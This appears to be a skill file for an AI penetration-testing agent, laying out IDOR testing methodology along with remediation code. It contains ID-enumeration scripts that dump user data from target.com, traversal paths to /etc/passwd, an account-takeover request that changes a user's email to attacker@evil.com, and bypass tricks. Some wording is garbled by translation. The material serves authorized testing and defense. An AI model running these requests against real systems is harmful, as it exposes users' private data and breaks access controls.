---
name: idor-testing
Professional skills and methodology for IDOR (insecure direct object reference) testing
version: 1.0.0
---

# IDOR (Insecure Direct Object Reference) Testing

## Overview

This skill provides detection, use, and protection of IDOR vulnerabilities.

## Vulnerability Principle

The application uses a predictable identifier (e.g. ID, filename) for direct reference to the resource and does not verify that the current user has access to the resource.

**Example of hazard code:**
```php
// Direct use of the user-supplied ID
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## Test Method

### 1. Identify direct object references

**Common resource type:**
- User ID
- File ID / file name
- OrderID
- DocumentID
- Account ID
- RecordsID

**Common locations:**
- URL parameter
- POST data
- Cookie value
- HTTPHead
- File Path

### 2. Enumeration Test

**Sequential ID test:**
```
/user?id=1
/user?id=2
/user?id=3
```

**UUID test:**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**Filename test:**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. Horizontal permission test

**Access another user's resources:**
```
Current User ID: 100
Test: /user?id=101
Test: /user?id=102
```

**Access another user's files:**
```
/files/user100_document.pdf
Test: /files/user101_document.pdf
```

### 4. Vertical Permission Test

**A regular user accessing administrator resources:**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## Exploitation Techniques

### User Information Disclosure

**Enumerate user profiles:**
```bash
# Sequential enumeration
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# Observe the response differences
```

### File Access

**Access another user's files:**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**Combined with Directory Traversal:**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### Data Modification

**Modify another user's data:**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### Batch Operations

**Bulk data retrieval:**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## Bypass Techniques

### IDConfusion

**Base64 encoding:**
```
OriginalID: 123
Encoded: MTIz
URL: /user?id=MTIz
```

**Hash value:**
```
OriginalID: 123
Hash: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### Parameter Name Obfuscation

**Using different parameter names:**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### HTTPWay around.

**Try different zzozz methods:**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### Path Obfuscation

**Try different paths:**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## Using the Tools

### Burp Suite

**Using Intruder:**
1. Intercept the request
2. Send toIntruder
3. Mark ID parameters
4. Use numerical series or custom list
5. Observe the response differences

**Using Repeater:**
1. Manual ChangesID
2. Test Different Values
3. Observe the Response

### OWASP ZAP

```bash
# UsingZAPConductIDORScan
zap-cli active-scan --scanners all http://target.com
```

### PythonScript

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## Verification and Reporting

### Verification Steps

1. Confirm that access to unauthorized resources
2. Verify that another user's data can be read, modified, or deleted other user data
3. Assess the impact (data disclosure, invasion of privacy, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Gap location and resource identifier
- Accessible unauthorized resources
- the complete exploitation steps andPoC
- Remediation recommendations (access control, resource mapping, etc.)

## Preventive Measures

### Recommended Approach

1. **Access Control Authentication**
   ```python
   def get_user_data(user_id, current_user_id):
       # Verify the permission
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
       # Return the data
       return db.get_user(user_id)
   ```

2. **Indirect Object Reference**
   ```python
   # Use the mapping table
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **Role-based access control**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **Validation of resource ownership**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
       # Verify the ownership
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
       # Update the data
       db.update_user(user_id, data)
   ```

5. **Use unpredictable identifiers**
   ```python
   import uuid
   
   # UsingUUIDSubstitution OrderID
   resource_id = str(uuid.uuid4())
   ```

6. **Principle of Least Privilege**
   - Returns only the data that the user has access to with permission
   - Use data filtering
   - Limit the range of resources available

## Important Notes

- Perform only in an authorized testing environment
- Avoid access to or modification of real user data
- Note the access-control differences between resources
- Be careful with the frequency of requests during testing and avoid triggering protection.